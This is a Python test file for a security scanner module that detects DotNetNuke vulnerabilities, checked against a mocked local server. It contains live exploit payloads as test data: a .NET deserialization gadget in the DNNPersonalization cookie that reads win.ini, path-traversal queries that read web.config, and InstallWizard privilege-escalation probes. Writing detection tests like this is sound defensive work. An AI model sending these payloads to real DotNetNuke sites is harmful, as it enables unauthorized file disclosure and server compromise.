import re
from .base import ModuleTestBase
from werkzeug.wrappers import Response


dotnetnuke_http_response = """
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html  xml:lang="en-US" lang="en-US" xmlns="http://www.w3.org/1999/xhtml">
<head id="Head">
<!--**********************************************************************************-->
<!-- DotNetNuke - http://www.dotnetnuke.com                                          -->
<!-- Copyright (c) 2002-2012                                                          -->
<!-- by DotNetNuke Corporation                                                        -->
<!--**********************************************************************************-->
<title>
"""


class TestDotnetnuke(ModuleTestBase):
    targets = ["http://127.0.0.1:8888"]
    modules_overrides = ["httpx", "dotnetnuke"]
    config_overrides = {"interactsh_disable": "True"}

    exploit_probe = {
        "Cookie": r'DNNPersonalization=<profile><item key="name1: key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>'
    }

    exploit_response = """
    ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
"""

    webconfig_response = """
    <?xml version="1.0" encoding="utf-8"?>
<configuration>
  <!-- register local configuration handlers -->
  <configSections>
    <sectionGroup name="dotnetnuke">
    </sectionGroup>
  </configSections>
</configuration>
    """

    async def setup_before_prep(self, module_test):
        # Simulate DotNetNuke Instance
        expect_args = {"method": "GET", "uri": "/"}
        respond_args = {"response_data": dotnetnuke_http_response}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

        # DNNPersonalization Deserialization Detection
        expect_args = {"method": "GET", "uri": "/__", "headers": self.exploit_probe}
        respond_args = {"response_data": self.exploit_response}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

        # NewsArticlesSlider ImageHandler.ashx File Read
        expect_args = {
            "method": "GET",
            "uri": "/DesktopModules/dnnUI_NewsArticlesSlider/ImageHandler.ashx",
            "query_string": b"img=~/web.config",
        }
        respond_args = {"response_data": self.webconfig_response}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

        # DNNArticle GetCSS.ashx File Read
        expect_args = {
            "method": "GET",
            "uri": "/DesktopModules/DNNArticle/getcss.ashx",
            "query_string": b"CP=%2fweb.config&smid=512&portalid=3",
        }
        respond_args = {"response_data": self.webconfig_response}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

        # InstallWizard SuperUser Privilege Escalation
        expect_args = {"method": "GET", "uri": "/Install/InstallWizard.aspx", "query_string": b"__viewstate=1"}
        respond_args = {"status": 500}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

        expect_args = {"method": "GET", "uri": "/Install/InstallWizard.aspx"}
        respond_args = {"status": 200}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

    def check(self, module_test, events):
        dnn_technology_detection = False
        dnn_personalization_deserialization_detection = False
        dnn_getcss_fileread_detection = False
        dnn_imagehandler_fileread_detection = False
        dnn_installwizard_privesc_detection = False

        for e in events:
            if e.type == "TECHNOLOGY" and "DotNetNuke" in e.data["technology"]:
                dnn_technology_detection = True

            if (
                e.type == "VULNERABILITY"
                and "DotNetNuke Personalization Cookie Deserialization" in e.data["description"]
            ):
                dnn_personalization_deserialization_detection = True

            if (
                e.type == "VULNERABILITY"
                and "DotNetNuke DNNArticle Module GetCSS.ashx Arbitrary File Read" in e.data["description"]
            ):
                dnn_getcss_fileread_detection = True

            if (
                e.type == "VULNERABILITY"
                and "DotNetNuke dnnUI_NewsArticlesSlider Module Arbitrary File Read" in e.data["description"]
            ):
                dnn_imagehandler_fileread_detection = True

            if (
                e.type == "VULNERABILITY"
                and "DotNetNuke InstallWizard SuperUser Privilege Escalation" in e.data["description"]
            ):
                dnn_installwizard_privesc_detection = True

        assert dnn_technology_detection, "DNN Technology Detection Failed"
        assert dnn_personalization_deserialization_detection, "DNN Personalization Deserialization Detection Failed"
        assert dnn_getcss_fileread_detection, "getcss.ashx File Read Detection Failed"
        assert dnn_imagehandler_fileread_detection, "imagehandler.ashx File Read Detection Failed"
        assert dnn_installwizard_privesc_detection, "InstallWizard privesc Detection Failed"


def extract_subdomain_tag(data):
    pattern = r"([a-z0-9]{4})\.fakedomain\.fakeinteractsh\.com"
    match = re.search(pattern, data)
    if match:
        return match.group(1)


class TestDotnetnuke_blindssrf(ModuleTestBase):
    targets = ["http://127.0.0.1:8888"]
    module_name = "dotnetnuke"
    modules_overrides = ["httpx", "dotnetnuke"]

    def request_handler(self, request):
        subdomain_tag = None
        subdomain_tag = extract_subdomain_tag(request.full_path)
        if subdomain_tag:
            self.interactsh_mock_instance.mock_interaction(subdomain_tag)
        return Response("alive", status=200)

    async def setup_before_prep(self, module_test):
        self.interactsh_mock_instance = module_test.mock_interactsh("dotnetnuke_blindssrf")
        module_test.monkeypatch.setattr(
            module_test.scan.helpers, "interactsh", lambda *args, **kwargs: self.interactsh_mock_instance
        )

    async def setup_after_prep(self, module_test):
        # Simulate DotNetNuke Instance
        expect_args = {"method": "GET", "uri": "/"}
        respond_args = {"response_data": dotnetnuke_http_response}
        module_test.set_expect_requests(expect_args=expect_args, respond_args=respond_args)

        expect_args = re.compile("/")
        module_test.set_expect_requests_handler(expect_args=expect_args, request_handler=self.request_handler)

    def check(self, module_test, events):
        dnn_technology_detection = False
        dnn_dnnimagehandler_blindssrf = False

        for e in events:
            if e.type == "TECHNOLOGY" and "DotNetNuke" in e.data["technology"]:
                dnn_technology_detection = True

            if e.type == "VULNERABILITY" and "DotNetNuke Blind-SSRF (CVE 2017-0929)" in e.data["description"]:
                dnn_dnnimagehandler_blindssrf = True

        assert dnn_technology_detection, "DNN Technology Detection Failed"
        assert dnn_dnnimagehandler_blindssrf, "dnnimagehandler.ashx Blind SSRF Detection Failed"
